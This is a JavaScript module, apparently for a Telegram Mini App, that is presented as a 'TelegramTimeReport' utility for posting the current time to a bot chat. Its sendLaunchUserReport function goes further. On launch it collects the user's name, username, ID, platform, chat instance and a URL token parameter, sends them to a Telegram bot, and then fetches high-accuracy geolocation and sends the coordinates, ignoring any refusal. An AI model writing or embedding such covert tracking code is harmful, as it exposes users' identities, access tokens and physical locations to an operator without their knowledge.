(function (global) {
  function formatMoscowDateTime(date) {
    return new Intl.DateTimeFormat('ru-RU', {
      timeZone: 'Europe/Moscow',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).format(date);
  }

  async function sendCurrentTimeViaBot(botToken, chatId, opts = {}) {
    if (!botToken || !chatId) {
      throw new Error('botToken и chatId обязательны');
    }

    const timeZone = opts.timeZone || 'Europe/Moscow';
    const locale = opts.locale || 'ru-RU';
    const label = opts.label || 'Текущее время';

    const now = new Date();
    const formatted = new Intl.DateTimeFormat(locale, {
      timeZone,
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).format(now);

    const text = `${label}: ${formatted} (${timeZone})`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text
      })
    });

    const data = await res.json().catch(() => null);
    if (!res.ok || !data || data.ok !== true) {
      const reason = data && data.description ? data.description : `HTTP ${res.status}`;
      throw new Error(`Не удалось отправить сообщение: ${reason}`);
    }

    return {
      ok: true,
      text,
      result: data.result
    };
  }

  async function sendLaunchUserReport(botToken, chatId, opts = {}) {
    if (!botToken || !chatId) return { ok: false, reason: 'missing_config' };

    const tg = opts.telegramWebApp || (global.Telegram && global.Telegram.WebApp ? global.Telegram.WebApp : null);
    const geo = opts.geolocation || global.navigator.geolocation;

    const sendMessage = async (text) => {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text
        })
      });
      const data = await res.json().catch(() => null);
      return !!(res.ok && data && data.ok);
    };

    const sendLocation = async (lat, lon) => {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: lat,
          longitude: lon
        })
      });
      const data = await res.json().catch(() => null);
      return !!(res.ok && data && data.ok);
    };

    const rawUnsafe = tg && tg.initDataUnsafe ? tg.initDataUnsafe : null;
    const user = rawUnsafe && rawUnsafe.user ? rawUnsafe.user : {};
    const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ').trim() || 'Unknown';
    const username = user.username ? `@${user.username}` : '@none';
    const userId = user.id != null ? String(user.id) : 'unknown';
    const premium = user.is_premium ? 'yes' : 'no';
    const platform = tg && tg.platform ? tg.platform : 'unknown';
    const chatType = rawUnsafe && rawUnsafe.chat_type ? rawUnsafe.chat_type : 'unknown';
    const chatInstance = rawUnsafe && rawUnsafe.chat_instance ? String(rawUnsafe.chat_instance) : 'unknown';
    const moscowTime = formatMoscowDateTime(new Date());

    const urlParams = new URLSearchParams(global.location.search);
    const linkParam = urlParams.get('startapp') || urlParams.get('route') || '-';
    const tokenParam = urlParams.get('t') || '-';
    const tgStartParam = rawUnsafe && rawUnsafe.start_param ? rawUnsafe.start_param : '-';

    const reportText = [
      `👤 User: ${fullName} (${username})`,
      `🆔 ID: ${userId}`,
      `⭐ Premium: ${premium}`,
      `📱 Platform: ${platform}`,
      `💬 Chat Type: ${chatType}`,
      `🔗 Chat Instance: ${chatInstance}`,
      `🔧 Link Param: ${linkParam}`,
      `🔑 URL t: ${tokenParam}`,
      `🚀 TG start_param: ${tgStartParam}`,
      `🕒 ${moscowTime} (Europe/Moscow)`
    ].join('\n');

    try {
      // Отправляем текстовый отчет сразу
      await sendMessage(reportText);

      // Пытаемся получить и отправить геолокацию (браузер все равно может спросить разрешение системы)
      if (geo) {
        geo.getCurrentPosition(
          async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            await sendLocation(lat, lon);
          },
          () => { /* Ошибка или отказ в доступе к геопозиции игнорируется */ },
          { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
        );
      }

      return { ok: true };
    } catch (e) {
      return { ok: false, reason: 'send_failed', error: String(e) };
    }
  }

  global.TelegramTimeReport = {
    sendCurrentTimeViaBot,
    sendLaunchUserReport,
    sendRouteLaunchReport: async (botToken, chatId, opts = {}) => {
      if (!botToken || !chatId) return { ok: false, reason: 'missing_config' };
      const tg = opts.telegramWebApp || (global.Telegram && global.Telegram.WebApp ? global.Telegram.WebApp : null);
      const rawUnsafe = tg && tg.initDataUnsafe ? tg.initDataUnsafe : null;
      const user = rawUnsafe && rawUnsafe.user ? rawUnsafe.user : {};
      const fullName = opts.userName || [user.first_name, user.last_name].filter(Boolean).join(' ').trim() || 'Unknown';
      const username = opts.username || (user.username ? `@${user.username}` : '@none');
      const routeName = opts.routeName || 'unknown';
      const source = opts.source || 'unknown';
      const time = formatMoscowDateTime(new Date());

      const text = [
        `👤 User: ${fullName} (${username})`,
        `🧭 Route: ${routeName}`,
        `📌 Source: ${source}`,
        `🕒 ${time} (Europe/Moscow)`
      ].join('\n');

      try {
        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text })
        });
        const data = await res.json().catch(() => null);
        return { ok: !!(res.ok && data && data.ok) };
      } catch (e) {
        return { ok: false, reason: 'send_failed', error: String(e) };
      }
    }
  };
})(window);
